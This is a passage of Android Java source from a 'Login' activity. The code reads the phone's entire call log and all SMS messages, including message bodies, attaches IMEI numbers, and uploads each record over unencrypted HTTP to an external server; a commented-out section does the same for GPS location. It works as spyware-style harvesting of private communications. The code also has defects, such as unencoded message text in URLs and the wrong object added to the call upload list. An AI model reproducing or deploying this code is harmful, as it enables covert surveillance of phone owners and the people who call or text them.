            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            callDuration = managedCursor.getString(duration);
            callphAccID = managedCursor.getString(phAccID);
            finalCallType = null;

            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    finalCallType = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    finalCallType = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    finalCallType = "MISSED";
                    break;
            }
            sdfSaveArray = new SimpleDateFormat("yyyy-MM-dd HH:mm:sss");
            strdateFormated = sdfSaveArray.format(callDayTime);

            callDetialswithIMEI = new CallDetialswithIMEI(callPhoneno, finalCallType, strdateFormated, callDuration, IMEINumber1, IMEINumber2, callphAccID);
            mCallArrayList.add(callDetialswithIMEI);
        }
        Log.d("callarraysize", mCallArrayList.size() + "");

        requestQueue = Volley.newRequestQueue(Login.this);
        urlCallDate = "http://anilsahasrabuddhe.in/rohit-testing/imeicasesdetailsinsert.php?clientid=AnDe828500&caseid=405&IMEI=351891080405985";
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.GET, urlCallDate, null,
                new callSuccess(), new callFail());

        jsonObjectRequest.setRetryPolicy(new DefaultRetryPolicy(
                DefaultRetryPolicy.DEFAULT_TIMEOUT_MS * 2,
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        requestQueue.add(jsonObjectRequest);
    }

    public void uploadCalls(String callPhoneno, String finalCallType, final String strdateFormated,
                            String callDuration, final String callIMEI1, String callIMEI2, String callphAccID) {

        if (requestQueue == null) {
            requestQueue = Volley.newRequestQueue(Login.this);
        } else {
            String strurl = "http://anilsahasrabuddhe.in/rohit-testing/imeicasesdetailsinsert.php?clientid=AnDe828500&caseid=401&MobileNo=" + callPhoneno +
                    "&CallType=" + finalCallType + "&CallDate=" + strdateFormated + "&CallDuration=" + callDuration +
                    "&IMEI1=" + callIMEI1 + "&IMEI2=" + callIMEI2 + "&PhoneAccountId=" + callphAccID;


            StringRequest stringRequest = new StringRequest(Request.Method.GET, strurl, new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    //Log.d("ChatResponse", response);
                    if (response.contains("Call inserted successfully")) {
                        //Toast.makeText(MainActivity.this, "Record inserted successfully", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(Login.this, "Record not inserted successfully", Toast.LENGTH_SHORT).show();
                    }
                    counturl++;
                    Log.d("url count", counturl + " / " + "&CallDate=" + strdateFormated + " / " + response + " / " + callIMEI1);
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.d("VolleyError", String.valueOf(error));
                }
            });

            stringRequest.setRetryPolicy(new RetryPolicy() {
                @Override
                public int getCurrentTimeout() {
                    return 50000;
                }

                @Override
                public int getCurrentRetryCount() {
                    return 50000;
                }

                @Override
                public void retry(VolleyError error) throws VolleyError {

                }
            });

            stringRequest.setRetryPolicy(new DefaultRetryPolicy(
                    DefaultRetryPolicy.DEFAULT_TIMEOUT_MS * 2,
                    DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                    DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));

            requestQueue.add(stringRequest);
        }
    }

    private class callSuccess implements Response.Listener<JSONObject> {
        @Override
        public void onResponse(JSONObject response) {
            Log.e("success", String.valueOf(response));
            try {
                JSONArray jsonArray = response.getJSONArray("data");
                for (int i = 0; i < jsonArray.length(); i++) {
                    JSONObject jsonObject = jsonArray.getJSONObject(i);

                    JSONObject lastdate = jsonObject.getJSONObject("dtCallDate");
                    String mlastdate = lastdate.getString("date");

                    Log.d("lastdate", mlastdate);
                    callDetailsFetch = new CallDetailsFetch(mlastdate);
                    mUrlCallArrayList.add(callDetailsFetch);
                }
                Log.d("urlarrlen", mUrlCallArrayList.size() + "");


                for (int i = 0; i < mCallArrayList.size(); i++) {
                    String clno = mCallArrayList.get(i).getmCallMobileNo();
                    String cltype = mCallArrayList.get(i).getmCallType();
                    String cldate = mCallArrayList.get(i).getmCallDate();
                    String clduration = mCallArrayList.get(i).getmCallDuration();
                    String climei1 = mCallArrayList.get(i).getmIMEI1();
                    String climei2 = mCallArrayList.get(i).getmIMEI2();
                    String clphAccID = mCallArrayList.get(i).getmphAccID();

                    if (mUrlCallArrayList.size() == 0) {
                        uploadCalls(clno, cltype, cldate, clduration, climei1, climei2, clphAccID);
                    } else {
                        String strCompareRecord = mUrlCallArrayList.get(mUrlCallArrayList.size() - 1).getmfthCallDate();
                        Date dtMydate = sdfComapre.parse(strCompareRecord);
                        String strUrlDate = sdfComapre.format(dtMydate);

                        if (strUrlDate.compareTo(cldate) < 0) {
                            Log.d("datematch", strUrlDate + " / " + cldate);
                            callDetialswithIMEI = new CallDetialswithIMEI(clno, cltype, cldate, clduration, climei1, climei2, clphAccID);
                            mUploadCallArrayList.add(callDetails);
                        }
                    }
                }
                Log.d("recordscall", "call upload without date");
                Log.d("uploadarraysizecall", mUploadCallArrayList.size() + "");
            } catch (ParseException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }

            for (int i = 0; i < mUploadCallArrayList.size(); i++) {
                String clno = mUploadCallArrayList.get(i).getmCallMobileNo();
                String cltype = mUploadCallArrayList.get(i).getmCallType();
                String cldate = mUploadCallArrayList.get(i).getmCallDate();
                String clduration = mUploadCallArrayList.get(i).getmCallDuration();
                String climei1 = mUploadCallArrayList.get(i).getmIMEI1();
                String climei2 = mUploadCallArrayList.get(i).getmIMEI2();
                String clphAccID = mUploadCallArrayList.get(i).getmphAccID();

                uploadCalls(clno, cltype, cldate, clduration, climei1, climei2, clphAccID);
            }
            Toast.makeText(Login.this, "Call Records Upload Successfully.", Toast.LENGTH_SHORT).show();
            Log.d("recordscall", "call upload with date");
        }
    }

    private class callFail implements Response.ErrorListener {
        @Override
        public void onErrorResponse(VolleyError error) {
            Log.e("Fail", String.valueOf(error));
        }
    }


    ///////////////////////////Location////////////////////////////////


    /*@TargetApi(Build.VERSION_CODES.M)
    public void getUserLocation() {
        mGoogleApiClient = new GoogleApiClient.Builder(this)
                .addConnectionCallbacks(this)
                .addOnConnectionFailedListener(this)
                .addApi(LocationServices.API)
                .build();

        locationManager = (LocationManager)this.getSystemService(Context.LOCATION_SERVICE);

        checkLocation(); //check whether location service is enable or not in your  phone
    }

    @Override
    public void onConnected(Bundle bundle) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        mLocation = LocationServices.FusedLocationApi.getLastLocation(mGoogleApiClient);

        if (mLocation != null) {

            currentLat = mLocation.getLatitude();
            currentLong = mLocation.getLongitude();
            Log.d("latlong",currentLat+" / "+currentLong);

            uploadLocation(IMEINumber1, IMEINumber2, currentLat, currentLong);    //upload location method
            Log.d("location uploaded.",currentLat+" / "+currentLong);
            Toast.makeText(this, "Location Uploaded", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(this, "Location not Detected", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onConnectionSuspended(int i) {
        Log.i("conn suspend", "Connection Suspended");
        mGoogleApiClient.connect();
    }

    @Override
    public void onConnectionFailed(ConnectionResult connectionResult) {
        Log.i("conn fail", "Connection failed. Error: " + connectionResult.getErrorCode());
    }

    @Override
    protected void onStart() {
        super.onStart();
        if (mGoogleApiClient != null) {
            mGoogleApiClient.connect();
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
        if (mGoogleApiClient.isConnected()) {
            mGoogleApiClient.disconnect();
        }
    }

    @Override
    public void onLocationChanged(Location location) {
    }

    private boolean checkLocation() {
        if(!isLocationEnabled()) {
            return isLocationEnabled();
        }
        return true;
    }

    private boolean isLocationEnabled() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    }

    public void uploadLocation(String callIMEI1, String callIMEI2, final double latitude, final double longitude) {

        if (requestQueue == null) {
            requestQueue = Volley.newRequestQueue(Login.this);
        } else {
            String strurl = "http://anilsahasrabuddhe.in/rohit-testing/imeicasesdetailsinsert.php?clientid=AnDe828500&caseid=403&IMEI1=" + callIMEI1
                    + "&IMEI2=" + callIMEI2 + "&latitude=" + latitude + "&longitude=" + longitude;

            StringRequest stringRequest = new StringRequest(Request.Method.GET, strurl, new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    if (response.contains("Data inserted successfully")) {
                        Toast.makeText(Login.this, "Location inserted successfully", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(Login.this, "Location not inserted successfully", Toast.LENGTH_SHORT).show();
                    }
                    Log.d("url count", counturl + " / " + "&latitude=" + latitude + " / " + "&longitude=" + longitude + " / " + response);
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.d("VolleyError", String.valueOf(error));
                }
            });

            stringRequest.setRetryPolicy(new RetryPolicy() {
                @Override
                public int getCurrentTimeout() {
                    return 50000;
                }

                @Override
                public int getCurrentRetryCount() {
                    return 50000;
                }

                @Override
                public void retry(VolleyError error) throws VolleyError {
                }
            });
            stringRequest.setRetryPolicy(new DefaultRetryPolicy(
                    DefaultRetryPolicy.DEFAULT_TIMEOUT_MS * 2,
                    DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                    DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));

            requestQueue.add(stringRequest);
        }
    }
*/

    //////////////////////////////////SMS/////////////////////////////////



    @SuppressLint("NewApi")
    public void getSMSDetails() {

        if (ContextCompat.checkSelfPermission(Login.this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(Login.this, Manifest.permission.READ_SMS)) {
                ActivityCompat.requestPermissions(Login.this, new String[]
                        {Manifest.permission.READ_SMS}, 2);
            } else {
                ActivityCompat.requestPermissions(Login.this, new String[]
                        {Manifest.permission.READ_SMS}, 2);
            }
        } else {
            getSMSLogDetails();
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void getSMSLogDetails() {

        Uri uri = Uri.parse("content://sms");
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);

        mSMSArrayList = new ArrayList<>();
        mUrlSMSArrayList = new ArrayList<>();
        mUploadSMSArrayList = new ArrayList<>();
        sdfComapre = new SimpleDateFormat("yyyy-MM-dd HH:mm:sss");

        if (cursor.moveToFirst()) {
            for (int i = 0; i < cursor.getCount(); i++) {
                String smsbody = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                String phoneno = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));
                Date smsDayTime = new Date(Long.valueOf(date));
                String smstype = cursor.getString(cursor.getColumnIndexOrThrow("type"));

                String typeOfSMS = null;
                switch (Integer.parseInt(smstype)) {
                    case 1:
                        typeOfSMS = "INBOX";
                        break;

                    case 2:
                        typeOfSMS = "SENT";
                        break;

                    case 3:
                        typeOfSMS = "DRAFT";
                        break;
                }
                sdfSaveArray = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                String strdateFormated = sdfSaveArray.format(smsDayTime);

                smsDetails = new SMSDetails(phoneno, typeOfSMS, strdateFormated, smsbody, IMEINumber1, IMEINumber2);
                mSMSArrayList.add(smsDetails);
                cursor.moveToNext();
            }
        }
        Log.d("smsarraylist", String.valueOf(mSMSArrayList.size()));

        requestQueue = Volley.newRequestQueue(Login.this);
        String urlSMSDate = "http://anilsahasrabuddhe.in/rohit-testing/imeicasesdetailsinsert.php?clientid=AnDe828500&caseid=406&IMEI=351891080405985";
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.GET, urlSMSDate, null,
                new smsSuccess(), new smsFail());

        jsonObjectRequest.setRetryPolicy(new DefaultRetryPolicy(
                DefaultRetryPolicy.DEFAULT_TIMEOUT_MS * 2,
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        requestQueue.add(jsonObjectRequest);
    }

    public void uploadSMS(String smsPhoneno, String finalsmsType, final String strdateFormated,
                          String smsBody, String smsIMEI1, String smsIMEI2) {

        if (requestQueue == null) {
            requestQueue = Volley.newRequestQueue(Login.this);
        } else {
            String strurl = "http://anilsahasrabuddhe.in/rohit-testing/imeicasesdetailsinsert.php?clientid=AnDe828500&caseid=402&MobileNo=" + smsPhoneno +
                    "&SMSType=" + finalsmsType + "&SMSDate=" + strdateFormated + "&SMSBODY=" + smsBody +
                    "&IMEI1=" + smsIMEI1 + "&IMEI2=" + smsIMEI2;

            StringRequest stringRequest = new StringRequest(Request.Method.GET, strurl, new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    //Log.d("ChatResponse", response);
                    if (response.contains("SMS inserted successfully")) {
                        //Toast.makeText(MainActivity.this, "Record inserted successfully", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(Login.this, "Record not inserted successfully", Toast.LENGTH_SHORT).show();
                    }
                    counturl++;
                    Log.d("url count", counturl + " / " + "&SMSDate=" + strdateFormated + " / " + response);
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.d("VolleyError", String.valueOf(error));
                }
            });

            stringRequest.setRetryPolicy(new RetryPolicy() {
                @Override
                public int getCurrentTimeout() {
                    return 50000;
                }

                @Override
                public int getCurrentRetryCount() {
                    return 50000;
                }

                @Override
                public void retry(VolleyError error) throws VolleyError {

                }
            });

            stringRequest.setRetryPolicy(new DefaultRetryPolicy(
                    DefaultRetryPolicy.DEFAULT_TIMEOUT_MS * 2,
                    DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                    DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));

            requestQueue.add(stringRequest);
        }
    }

    private class smsSuccess implements Response.Listener<JSONObject> {
        @Override
        public void onResponse(JSONObject response) {
           // Log.d("success", urlSMSDate);

            Log.e("success", String.valueOf(response));
            try {
                JSONArray jsonArray = response.getJSONArray("data");
                for (int i = 0; i < jsonArray.length(); i++) {
                    JSONObject jsonObject = jsonArray.getJSONObject(i);

                    JSONObject lastdate = jsonObject.getJSONObject("dtSMSDate");
                    String mlastdate = lastdate.getString("date");

                    Log.d("lastdate", mlastdate);
                    smsDetailsFetch = new SMSDetailsFetch(mlastdate);
                    mUrlSMSArrayList.add(smsDetailsFetch);
                }
                Log.d("urlarrlen", mUrlSMSArrayList.size() + "");

                Collections.reverse(mSMSArrayList);
                for (int i = 0; i < mSMSArrayList.size(); i++) {
                    String smsno = mSMSArrayList.get(i).getmSMSMobileNo();
                    String smstype = mSMSArrayList.get(i).getmSMStype();
                    String smsdate = mSMSArrayList.get(i).getmSMSdate();
                    String smsbody = mSMSArrayList.get(i).getmSMSbody();
                    String smsimei1 = mSMSArrayList.get(i).getmSMSIMEI1();
                    String smsimei2 = mSMSArrayList.get(i).getmSMSIMEI2();

                    if (mUrlSMSArrayList.size() == 0) {
                        uploadSMS(smsno, smstype, smsdate, smsbody, smsimei1, smsimei2);
                    } else {
                        String strCompareRecord = mUrlSMSArrayList.get(mUrlSMSArrayList.size() - 1).getmfthSMSDate();
                        Date dtMydate = sdfComapre.parse(strCompareRecord);
                        String strUrlDate = sdfComapre.format(dtMydate);

                        if (strUrlDate.compareTo(smsdate) < 0) {
                            Log.d("datematch", strUrlDate + " / " + smsdate);
                            smsDetails = new SMSDetails(smsno, smstype, smsdate, smsbody, smsimei1, smsimei2);
                            mUploadSMSArrayList.add(smsDetails);
                        }
                    }
                }
                Log.d("recordsms", "sms upload with date");
                Log.d("uploadarraysizesms", mUploadSMSArrayList.size() + "");
            } catch (ParseException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }

            for (int i = 0; i < mUploadSMSArrayList.size(); i++) {
                String smsno = mUploadSMSArrayList.get(i).getmSMSMobileNo();
                String smstype = mUploadSMSArrayList.get(i).getmSMStype();
                String smsdate = mUploadSMSArrayList.get(i).getmSMSdate();
                String smsbody = mUploadSMSArrayList.get(i).getmSMSbody();
                String smsimei1 = mUploadSMSArrayList.get(i).getmSMSIMEI1();
                String smsimei2 = mUploadSMSArrayList.get(i).getmSMSIMEI2();

                uploadSMS(smsno, smstype, smsdate, smsbody, smsimei1, smsimei2);
            }
            Toast.makeText(Login.this, "SMS Records Upload Successfully.", Toast.LENGTH_SHORT).show();
            Log.d("recordsms", "sms upload");
        }
    }

    private class smsFail implements Response.ErrorListener {
        @Override
        public void onErrorResponse(VolleyError error) {
            Log.e("Fail", String.valueOf(error));
        }
    }






}